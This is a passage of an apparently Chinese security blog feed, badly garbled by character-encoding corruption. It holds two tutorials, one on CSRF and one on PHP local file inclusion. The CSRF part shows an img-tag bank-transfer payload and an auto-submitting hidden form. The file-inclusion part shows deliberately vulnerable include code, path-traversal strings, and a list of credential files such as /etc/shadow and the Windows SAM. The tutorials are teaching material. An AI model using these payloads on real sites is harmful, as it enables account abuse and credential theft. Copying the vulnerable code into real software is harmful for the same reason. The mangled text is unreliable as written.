çš„è½¬è´¦è¯·æ±‚è¿åŒèº«ä»½è®¤è¯ä¿¡æ¯å‘é€åˆ°é“¶è¡Œç½‘ç«™ã€‚</p><p>5ã€é“¶è¡Œç½‘ç«™çœ‹åˆ°èº«ä»½è®¤è¯ä¿¡æ¯ï¼Œè®¤ä¸ºè¯·æ±‚æ˜¯Tomçš„åˆæ³•æ“ä½œ</p><p>ä¹‹åï¼Œé“¶è¡Œç½‘ç«™ä¼šæŠ¥æ®Tomçš„æƒé™æ¥å¤„ç†Jerryæ‰€å‘èµ·çš„æ¶æ„è¯·æ±‚ï¼Œè¿™æ ·Jerryå°±è¾¾åˆ°äº†ä¼ªé€ Tomçš„èº«ä»½è¯·æ±‚é“¶è¡Œç½‘ç«™ç»™è‡ªå·±è½¬è´¦çš„ç›®çš„</p><p>åœ¨æ­¤è¿‡ç¨‹ä¸­å—å®³è€…Tomåªéœ€è¦åšä¸‹é¢ä¸¤ä»¶äº‹æƒ…ï¼Œæ”»å‡»è€…Jerryå°±èƒ½å¤Ÿå®ŒæˆCSRFæ”»å‡»ï¼š</p><ul><li>ç™»å½•å—ä¿¡ä»»é“¶è¡Œç½‘ç«™ï¼Œå¹¶ç”Ÿæˆèº«ä»½éªŒè¯ä¿¡æ¯ï¼›</li><li>åœ¨ä¸ç™»å‡ºé“¶è¡Œç½‘ç«™(æ¸…é™¤èº«ä»½éªŒè¯ä¿¡æ¯)çš„æƒ…å†µä¸‹ï¼Œè®¿é—®æ¶æ„ç«™ç‚¹Sns.comã€‚</li></ul><p>å¾ˆå¤šæƒ…å†µä¸‹æ‰€è°“çš„æ¶æ„ç«™ç‚¹ï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯ä¸€ä¸ªå­˜åœ¨å…¶ä»–æ¼æ´(å¦‚XSS) çš„å—ä¿¡ä»»ä¸”è¢«å¾ˆå¤šäººè®¿é—®çš„ç«™ç‚¹ï¼Œè¿™æ ·ï¼Œæ™®é€šç”¨æˆ·å¯èƒ½åœ¨ä¸çŸ¥ä¸è§‰ä¸­ä¾¿æˆä¸ºäº†å—å®³è€…</p><p><strong>æ”»å‡»æ¡ä»¶ï¼š</strong></p><ul><li>ç™»å½•å—ä¿¡ä»»ç½‘ç«™Aï¼Œå¹¶åœ¨æœ¬åœ°ç”ŸæˆCookie</li><li>åœ¨ä¸ç™»å‡ºAçš„æƒ…å†µä¸‹ï¼Œè®¿é—®å±é™©ç½‘ç«™B</li></ul><h1 id="CSRFæ”»å‡»åˆ†ç±»"><a href="#CSRFæ”»å‡»åˆ†ç±»" class="headerlink" title="CSRFæ”»å‡»åˆ†ç±»"></a>CSRFæ”»å‡»åˆ†ç±»</h1><p>CSRFæ¼æ´ä¸€èˆ¬åˆ†ä¸ºç«™å¤–å’Œç«™å†…ä¸¤ç§ç±»å‹ã€‚</p><ul><li><p>CSRFç«™å†…ç±»å‹çš„æ¼æ´åœ¨ä¸€å®šç¨‹åº¦ä¸Šæ˜¯ç”±äºç¨‹åºå‘˜æ»¥ç”¨<code>$_REQUEST</code>ç±»å˜é‡é€ æˆçš„ï¼Œä¸€äº›æ•æ„Ÿçš„æ“ä½œæœ¬æ¥æ˜¯è¦æ±‚ç”¨æˆ·ä»è¡¨å•æäº¤å‘èµ·POSTè¯·æ±‚ä¼ å‚ç»™ç¨‹åºï¼Œä½†æ˜¯ç”±äºä½¿ç”¨äº†<code>$_REQUEST</code>ç­‰å˜é‡ï¼Œç¨‹åºä¹Ÿæ¥æ”¶GETè¯·æ±‚ä¼ å‚ï¼Œè¿™æ ·å°±ç»™æ”»å‡»è€…ä½¿ç”¨CSRFæ”»å‡»åˆ›é€ äº†æ¡ä»¶ï¼Œä¸€èˆ¬æ”»å‡»è€…åªè¦æŠŠé¢„æµ‹å¥½çš„è¯·æ±‚å‚æ•°æ”¾åœ¨ç«™å†…ä¸€ä¸ªè´´å­æˆ–è€…ç•™è¨€çš„å›¾ç‰‡é“¾æ¥é‡Œï¼Œå—å®³è€…æµè§ˆäº†è¿™æ ·çš„é¡µé¢å°±ä¼šè¢«å¼ºè¿«å‘èµ·è¯·æ±‚</p></li><li><p>CSRFç«™å¤–ç±»å‹çš„æ¼æ´å…¶å®å°±æ˜¯ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„å¤–éƒ¨æäº¤æ•°æ®é—®é¢˜ï¼Œä¸€èˆ¬ç¨‹åºå‘˜ä¼šè€ƒè™‘ç»™ä¸€äº›ç•™è¨€è¯„è®ºç­‰çš„è¡¨å•åŠ ä¸Šæ°´å°ä»¥é˜²æ­¢SPAMé—®é¢˜ï¼Œä½†æ˜¯ä¸ºäº†ç”¨æˆ·çš„ä½“éªŒæ€§ï¼Œä¸€äº›æ“ä½œå¯èƒ½æ²¡æœ‰åšä»»ä½•é™åˆ¶ï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥å…ˆé¢„æµ‹å¥½è¯·æ±‚çš„å‚æ•°ï¼Œåœ¨ç«™å¤–çš„Webé¡µé¢é‡Œç¼–å†™javascriptè„šæœ¬ä¼ªé€ æ–‡ä»¶è¯·æ±‚æˆ–å’Œè‡ªåŠ¨æäº¤çš„è¡¨å•æ¥å®ç°GETã€POSTè¯·æ±‚ï¼Œç”¨æˆ·åœ¨ä¼šè¯çŠ¶æ€ä¸‹ç‚¹å‡»é“¾æ¥è®¿é—®ç«™å¤–çš„Webé¡µé¢ï¼Œå®¢æˆ·ç«¯å°±è¢«å¼ºè¿«å‘èµ·è¯·æ±‚</p></li></ul><h2 id="GETç±»å‹çš„CSRF"><a href="#GETç±»å‹çš„CSRF" class="headerlink" title="GETç±»å‹çš„CSRF"></a>GETç±»å‹çš„CSRF</h2><p><strong>ä»…ä»…é¡»è¦ä¸€ä¸ªHTTPè¯·æ±‚ã€‚å°±èƒ½å¤Ÿæ„é€ ä¸€æ¬¡ç®€å•çš„CSRF</strong></p><p>æ ·ä¾‹ï¼š</p><p>é“¶è¡Œç«™ç‚¹Aï¼šå®ƒä»¥GETè¯·æ±‚æ¥å®Œæ¯•é“¶è¡Œè½¬è´¦çš„æ“ä½œï¼Œå¦‚ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000 </span><br></pre></td></tr></table></figure><p>å±é™©ç«™ç‚¹Bï¼šå®ƒé‡Œé¢æœ‰ä¸€æ®µHTMLçš„ä»£ç ä¾‹å¦‚ä»¥ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://www.mybank.com/Transfer.php?toBankId</span>=<span class="string">11&amp;money</span>=<span class="string">1000</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>é¦–å…ˆï¼Œä½ ç™»å½•äº†é“¶è¡Œç«™ç‚¹Aï¼Œç„¶åè®¿é—®å±é™©ç«™ç‚¹Bï¼Œå™¢ï¼Œè¿™æ—¶ä½ ä¼šå‘ç°ä½ çš„é“¶è¡Œè´¦æˆ·å°‘äº†1000å—</p><p>ä¸ºä»€ä¹ˆä¼šè¿™æ ·å‘¢ï¼Ÿ</p><p><strong>åŸå› æ˜¯é“¶è¡Œç«™ç‚¹Aè¿åäº†HTTPè§„èŒƒï¼Œä½¿ç”¨GETè¯·æ±‚æ›´æ–°èµ„æº</strong></p></li><li><p>åœ¨è®¿é—®å±é™©ç«™ç‚¹Bçš„ä¹‹å‰ã€‚ä½ å·²ç»ç™»å½•äº†é“¶è¡Œç«™ç‚¹Aï¼Œè€ŒBä¸­çš„ ä¸€ä¸ªåˆæ³•çš„è¯·æ±‚ï¼Œä½†è¿™é‡Œè¢«ä¸æ³•åˆ†å­åˆ©ç”¨</p></li><li><p>æ‰€ä»¥ä½ çš„æµè§ˆå™¨ä¼šå¸¦ä¸Šä½ çš„é“¶è¡Œç«™ç‚¹Açš„Cookieå‘å‡ºGetè¯·æ±‚ï¼Œå»è·å–èµ„æºä»¥GETçš„æ–¹å¼è¯·æ±‚ç¬¬ä¸‰æ–¹èµ„æºï¼ˆè¿™é‡Œçš„ç¬¬ä¸‰æ–¹å°±æ˜¯æŒ‡é“¶è¡Œç«™ç‚¹äº†ï¼‰</p></li></ul><p>åŸæœ¬è¿™æ˜¯ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</span><br></pre></td></tr></table></figure><p>ç»“æœé“¶è¡Œç«™ç‚¹æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œè§‰å¾—è¿™æ˜¯ä¸€ä¸ªæ›´æ–°èµ„æºæ“ä½œï¼ˆè½¬è´¦æ“ä½œï¼‰ï¼Œæ‰€ä»¥å°±ç«‹é©¬è¿›è¡Œè½¬è´¦æ“ä½œ</p><h2 id="POSTç±»å‹çš„CSRF"><a href="#POSTç±»å‹çš„CSRF" class="headerlink" title="POSTç±»å‹çš„CSRF"></a>POSTç±»å‹çš„CSRF</h2><p>åœ¨CSRFæ”»å‡»æµè¡Œä¹‹åˆï¼Œæ›¾ç»æœ‰ä¸€ç§é”™è¯¯çš„è§‚ç‚¹ï¼Œè®¤ä¸ºCSRFæ”»å‡»åªèƒ½ç”±GETè¯·æ±‚å‘èµ·ã€‚å› æ­¤å¾ˆå¤šå¼€å‘è€…éƒ½è®¤ä¸ºåªè¦æŠŠé‡è¦çš„æ“ä½œæ”¹æˆåªå…è®¸POSTè¯·æ±‚ï¼Œå°±èƒ½é˜²æ­¢CSRFæ”»å‡»</p><p>è¿™æ ·çš„é”™è¯¯è§‚ç‚¹å½¢æˆçš„åŸå› ä¸»è¦åœ¨äºï¼Œå¤§å¤šæ•°CSRFæ”»å‡»å‘èµ·æ—¶ï¼Œä½¿ç”¨çš„HTMLæ ‡ç­¾éƒ½æ˜¯<code>&lt;image&gt;ã€&lt;iframe&gt;ã€&lt;script&gt;</code>ç­‰å¸¦<code>src</code>å±æ€§çš„æ ‡ç­¾ï¼Œè¿™ç±»æ ‡ç­¾åªèƒ½å¤Ÿå‘èµ·ä¸€æ¬¡GETè¯·æ±‚ï¼Œè€Œä¸èƒ½å‘èµ·POSTè¯·æ±‚</p><p>è€Œå¯¹äºå¾ˆå¤šç½‘ç«™çš„åº”ç”¨æ¥è¯´ï¼Œä¸€äº›é‡è¦æ“ä½œå¹¶æœªä¸¥æ ¼åœ°åŒºåˆ†GETä¸POSTï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨GETæ¥è¯·æ±‚è¡¨å•çš„æäº¤åœ°å€ã€‚æ¯”å¦‚åœ¨PHPä¸­ï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯<code>$_REQUEST</code>ï¼Œè€Œé$_POSTè·å–å˜é‡ï¼Œåˆ™ä¼šå­˜åœ¨è¿™ä¸ªé—®é¢˜</p><p>å¯¹äºä¸€ä¸ªè¡¨å•æ¥è¯´ï¼Œç”¨æˆ·å¾€å¾€ä¹Ÿå°±å¯ä»¥ä½¿ç”¨GETæ–¹å¼æäº¤å‚æ•°ã€‚æ¯”å¦‚ä»¥ä¸‹è¡¨å•:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot; / register&quot;</span> <span class="attr">id</span>=<span class="string">&quot;register&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç”¨æˆ·å¯å°è¯•æ„é€ ä¸€ä¸ªGETè¯·æ±‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http: //host/register?username=test&amp;password=passwd</span><br></pre></td></tr></table></figure><p>æ¥æäº¤ï¼Œè‹¥æœåŠ¡å™¨ç«¯æœªå¯¹è¯·æ±‚æ–¹æ³•è¿›è¡Œé™åˆ¶ï¼Œåˆ™è¿™ä¸ªè¯·æ±‚ä¼šé€šè¿‡</p><p>å¦‚æœæœåŠ¡å™¨ç«¯å·²ç»åŒºåˆ†äº†GETä¸POSTï¼Œé‚£ä¹ˆæ”»å‡»è€…æœ‰ä»€ä¹ˆæ–¹æ³•å‘¢?å¯¹äºæ”»å‡»è€…æ¥è¯´ï¼Œè‹¥å¹²ç§æ–¹æ³•å¯ä»¥æ„é€ å‡ºä¸€ä¸ªPOSTè¯·æ±‚</p><p>æœ€ç®€å•çš„æ–¹æ³•ï¼Œå°±æ˜¯åœ¨ä¸€ä¸ªé¡µé¢ä¸­æ„é€ å¥½ä¸€ä¸ªè¡¨å•è¡¨å•ï¼Œç„¶åä½¿ç”¨JavaScriptè‡ªåŠ¨æäº¤è¿™ä¸ªè¡¨å•ã€‚æ¯”å¦‚ï¼Œæ”»å‡»è€…åœ¨<code>www.b.com/test.html</code>ä¸­ç¼–å†™å¦‚ä¸‹ä»£ç </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http: / / www . a.com/register&quot;</span> <span class="attr">id</span>=<span class="string">&quot;register&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> &gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>/&gt;</span>&lt;/ form&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> f = <span class="variable language_">document</span>.<span class="property">getElementById</span> ( <span class="string">&quot;register&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">f.<span class="property">inputs</span> [<span class="number">0</span>].<span class="property">value</span> = <span class="string">&quot;test&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">f.<span class="property">inputs</span> [<span class="number">1</span>].<span class="property">value</span> = <span class="string">&quot;passwd&quot;</span> ;</span></span><br><span class="line"><span class="language-javascript">f.<span class="property">submit</span> ();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ”»å‡»è€…ç”šè‡³å¯ä»¥å°†è¿™ä¸ªé¡µé¢éšè—åœ¨ä¸€ä¸ªä¸å¯è§çš„<code>iframe</code>çª—å£ä¸­ï¼Œé‚£ä¹ˆæ•´ä¸ªè‡ªåŠ¨æäº¤è¡¨å•çš„è¿‡ç¨‹ï¼Œå¯¹äºç”¨æˆ·æ¥è¯´ä¹Ÿæ˜¯ä¸å¯è§çš„</p><h1 id="CSRFæ¼æ´æ£€æµ‹"><a href="#CSRFæ¼æ´æ£€æµ‹" class="headerlink" title="CSRFæ¼æ´æ£€æµ‹"></a>CSRFæ¼æ´æ£€æµ‹</h1><p>æ£€æµ‹CSRFæ¼æ´æ˜¯ä¸€é¡¹æ¯”è¾ƒç¹ççš„å·¥ä½œï¼Œæœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯æŠ“å–ä¸€ä¸ªæ­£å¸¸è¯·æ±‚çš„æ•°æ®åŒ…ï¼Œå»æ‰Refexexå­—æ®µåå†é‡æ–°æäº¤ï¼Œå¦‚æœè¯¥æäº¤è¿˜æœ‰æ•ˆï¼Œé‚£ä¹ˆåŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šå­˜åœ¨CSRFæ¼æ´</p><p>éšç€å¯¹CSRFæ¼æ´ç ”ç©¶çš„ä¸æ–­æ·±å…¥ï¼Œä¸æ–­æ¶Œç°å‡ºä¸€äº›ä¸“[é—¨é’ˆå¯¹CSRFæ¼æ´è¿›è¡Œæ£€æµ‹çš„å·¥å…·,å¦‚<code>CSRFTester</code>, <code>CSRF Request Builder</code>ç­‰</p><p>ä»¥<code>CSRFTester</code>å·¥å…·ä¸ºä¾‹ï¼ŒCSRFæ¼æ´æ£€æµ‹å·¥å…·çš„æµ‹è¯•åŸç†å¦‚ä¸‹ï¼šä½¿ç”¨<code>CSRFTester</code>è¿›è¡Œæµ‹è¯•æ—¶ï¼Œé¦–å…ˆéœ€è¦æŠ“å–æˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­è®¿é—®è¿‡çš„æ‰€æœ‰é“¾æ¥ä»¥åŠæ‰€æœ‰çš„è¡¨å•ç­‰ä¿¡æ¯ï¼Œç„¶åé€šè¿‡åœ¨<code>CSRFTester</code>ä¸­ä¿®æ”¹ç›¸åº”çš„è¡¨å•ç­‰ä¿¡æ¯ï¼Œé‡æ–°æäº¤ï¼Œè¿™ç›¸å½“äºä¸€æ¬¡ä¼ªé€ å®¢æˆ·ç«¯è¯·æ±‚ã€‚å¦‚æœä¿®æ”¹åçš„æµ‹è¯•è¯·æ±‚æˆåŠŸè¢«ç½‘ç«™æœåŠ¡å™¨æ¥å—ï¼Œåˆ™è¯´æ˜å­˜åœ¨CSRFæ¼æ´ï¼Œå½“ç„¶æ­¤æ¬¾å·¥å…·ä¹Ÿå¯ä»¥è¢«ç”¨æ¥è¿›è¡ŒCSRFæ”»å‡»</p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶åŒ…å«</title>
      <link href="/2023/08/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2023/08/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="æ–‡ä»¶åŒ…å«æ¦‚è¿°"><a href="#æ–‡ä»¶åŒ…å«æ¦‚è¿°" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¦‚è¿°"></a>æ–‡ä»¶åŒ…å«æ¦‚è¿°</h1><h2 id="ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«æ¼æ´"></a>ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«æ¼æ´</h2><p>å’ŒSQLæ³¨å…¥ç­‰æ”»å‡»æ–¹å¼ä¸€æ ·ï¼Œæ–‡ä»¶åŒ…å«æ¼æ´ä¹Ÿæ˜¯ä¸€ç§æ³¨å…¥å‹æ¼æ´ï¼Œå…¶æœ¬è´¨å°±æ˜¯è¾“å…¥ä¸€æ®µç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶çš„è„šæœ¬æˆ–è€…ä»£ç ï¼Œå¹¶è®©æœåŠ¡ç«¯æ‰§è¡Œ</p><p>ä»€ä¹ˆå«åŒ…å«å‘¢ï¼Ÿä»¥PHPä¸ºä¾‹ï¼Œæˆ‘ä»¬å¸¸å¸¸æŠŠå¯é‡å¤ä½¿ç”¨çš„å‡½æ•°å†™å…¥åˆ°å•ä¸ªæ–‡ä»¶ä¸­ï¼Œåœ¨ä½¿ç”¨è¯¥å‡½æ•°æ—¶ï¼Œç›´æ¥è°ƒç”¨æ­¤æ–‡ä»¶ï¼Œè€Œæ— éœ€å†æ¬¡ç¼–å†™å‡½æ•°ï¼Œè¿™ä¸€è¿‡ç¨‹å«åšåŒ…å«</p><p>æœ‰æ—¶å€™ç”±äºç½‘ç«™åŠŸèƒ½éœ€æ±‚ï¼Œä¼šè®©å‰ç«¯ç”¨æˆ·é€‰æ‹©è¦åŒ…å«çš„æ–‡ä»¶ï¼Œè€Œå¼€å‘äººå‘˜åˆæ²¡æœ‰å¯¹è¦åŒ…å«çš„æ–‡ä»¶è¿›è¡Œå®‰å…¨è€ƒè™‘ï¼Œå°±å¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹æ–‡ä»¶çš„ä½ç½®æ¥è®©åå°æ‰§è¡Œä»»æ„æ–‡ä»¶ï¼Œä»è€Œå¯¼è‡´æ–‡ä»¶åŒ…å«æ¼æ´</p><p>ä»¥PHPä¸ºä¾‹,å¸¸ç”¨çš„æ–‡ä»¶åŒ…å«å‡½æ•°æœ‰ä»¥ä¸‹å››ç§<br><code>include(),require(),include_once(),require_once()</code></p><p>åŒºåˆ«å¦‚ä¸‹:</p><ul><li><code>require()</code>ï¼šæ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶ä¼šäº§ç”Ÿè‡´å‘½é”™è¯¯ï¼Œå¹¶åœæ­¢è„šæœ¬è¿è¡Œ</li><li><code>include()</code>ï¼šæ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶åªä¼šäº§ç”Ÿè­¦å‘Šï¼Œè„šæœ¬ç»§ç»­æ‰§è¡Œ</li><li><code>require_once()</code>ä¸<code>require()</code>ç±»ä¼¼ï¼šå”¯ä¸€çš„åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«</li><li><code>include_once()</code>ä¸<code>include()</code>ç±»ä¼¼ï¼šå”¯ä¸€çš„åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«</li></ul><h2 id="æ¼æ´æˆå› åˆ†æ"><a href="#æ¼æ´æˆå› åˆ†æ" class="headerlink" title="æ¼æ´æˆå› åˆ†æ"></a>æ¼æ´æˆå› åˆ†æ</h2><p>æˆ‘ä»¬å…ˆç›´æ¥æ¥çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œç½‘é¡µä»£ç å¦‚ä¸‹:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨åˆ›å»ºä¸€ä¸ªphpinfo.phpé¡µé¢ï¼Œä»£ç å¦‚ä¸‹:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ–‡ä»¶åŒ…å«ï¼Œæˆ‘ä»¬é€šè¿‡includeå‡½æ•°æ¥æ‰§è¡Œphpinfo.phpé¡µé¢ï¼ŒæˆåŠŸè§£æ</p><p><img src="/img/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/file.png" alt=""></p><p>å°†phpinfo.phpæ–‡ä»¶åç¼€æ”¹ä¸ºtxtåè¿›è¡Œè®¿é—®ï¼Œä¾ç„¶å¯ä»¥è§£æ:</p><h1 id="æ–‡ä»¶åŒ…å«æ¼æ´åˆ†ç±»"><a href="#æ–‡ä»¶åŒ…å«æ¼æ´åˆ†ç±»" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´åˆ†ç±»"></a>æ–‡ä»¶åŒ…å«æ¼æ´åˆ†ç±»</h1><h2 id="æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´-LFI"><a href="#æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´-LFI" class="headerlink" title="æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´(LFI)"></a>æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´(LFI)</h2><p>èƒ½å¤Ÿæ‰“å¼€å¹¶åŒ…å«æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ï¼Œæˆ‘ä»¬ç§°ä¸ºæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´(LFI)<br>æµ‹è¯•ç½‘é¡µåŒ…å«å¦‚ä¸‹ä»£ç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç½‘ç«™åˆ©ç”¨æ–‡ä»¶åŒ…å«åŠŸèƒ½è¯»å–ä¸€äº›phpæ–‡ä»¶ï¼Œä¾‹å¦‚phpinfo:</p><p><img src="/img/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/file_01.png" alt=""></p><p>åˆ©ç”¨è¯¥ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥è¯»å–ä¸€äº›ç³»ç»Ÿæœ¬åœ°çš„æ•æ„Ÿä¿¡æ¯ã€‚<br>ä¾‹å¦‚:<code>C:\Windows\system.ini</code>æ–‡ä»¶</p><p>ï¼ˆ1ï¼‰ä½¿ç”¨ç»å¯¹è·¯å¾„</p><p>ä½¿ç”¨ç»å¯¹è·¯å¾„ç›´æ¥è¯»å–:</p><p><img src="/img/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/file_02.png" alt=""></p><p>ï¼ˆ2ï¼‰ä½¿ç”¨ç›¸å¯¹è·¯å¾„è¿›è¡Œè¯»å–</p><p>é€šè¿‡<code>./</code>è¡¨ç¤ºå½“å‰ä½ç½®è·¯å¾„ï¼Œ<code>../</code>è¡¨ç¤ºä¸Šä¸€çº§è·¯å¾„ä½ç½®ï¼Œåœ¨linuxä¸­åŒæ ·é€‚ç”¨</p><p>ä¾‹å¦‚å½“å‰é¡µé¢æ‰€åœ¨è·¯å¾„ä¸º<code>C:\Apache24\htdocs\</code>ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨<code>../</code>é€€åˆ°Cç›˜å†è¿›è¡Œè®¿é—®ï¼Œæ„é€ è·¯å¾„å¦‚ä¸‹ï¼š<br><code>../../windows/system.ini</code></p><p>ï¼ˆ3ï¼‰ä¸€äº›å¸¸è§çš„æ•æ„Ÿç›®å½•ä¿¡æ¯è·¯å¾„:</p><p>Windowsç³»ç»Ÿ:</p><ul><li><code>C:\boot.ini</code>     //æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬</li><li><code>C:\windows\system32\inetsrv\MetaBase.xml</code>     //IISé…ç½®æ–‡ä»¶</li><li><code>C:\windows\repair\sam</code>     //å­˜å‚¨Windowsç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç </li><li><code>C:\ProgramFiles\mysql\my.ini</code>     //Mysqlé…ç½®</li><li><code>C:\ProgramFiles\mysql\data\mysql\user.MYD</code>   //MySQL rootå¯†ç </li><li><code>C:\windows\php.ini</code>     //phpé…ç½®ä¿¡æ¯</li></ul><p>Linux/Unixç³»ç»Ÿ:</p><ul><li><code>/etc/password</code>     //è´¦æˆ·ä¿¡æ¯</li><li><code>/etc/shadow</code>     //è´¦æˆ·å¯†ç ä¿¡æ¯</li><li><code>/usr/local/app/apache2/conf/httpd.conf</code>     //Apache2é»˜è®¤é…ç½®æ–‡ä»¶</li><li><code>/usr/local/app/apache2/conf/extra/httpd-vhost.conf</code>     //è™šæ‹Ÿç½‘ç«™é…ç½®</li><li><code>/usr/local/app/php5/lib/php.ini</code>     //PHPç›¸å…³é…ç½®</li><li><code>/etc/httpd/conf/httpd.conf</code>     //Apacheé…ç½®æ–‡ä»¶</li><li><code>/etc/my.conf</code>     